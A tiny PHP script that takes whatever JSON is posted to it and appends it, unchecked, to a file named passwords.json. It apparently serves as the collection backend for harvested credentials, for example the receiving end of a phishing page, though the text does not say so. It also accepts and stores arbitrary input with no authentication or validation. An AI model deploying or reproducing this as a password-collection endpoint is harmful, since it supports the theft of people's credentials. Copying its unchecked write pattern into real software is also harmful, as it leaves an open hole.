<?php
$json = file_get_contents('php://input');

$passwords = file_get_contents('./passwords.json');
$passwords = substr_replace($passwords ,"", -1);
$passwords = $passwords.",".$json."]";
$file = fopen('./passwords.json', "w");

fwrite($file, $passwords);
fclose($file);
?>
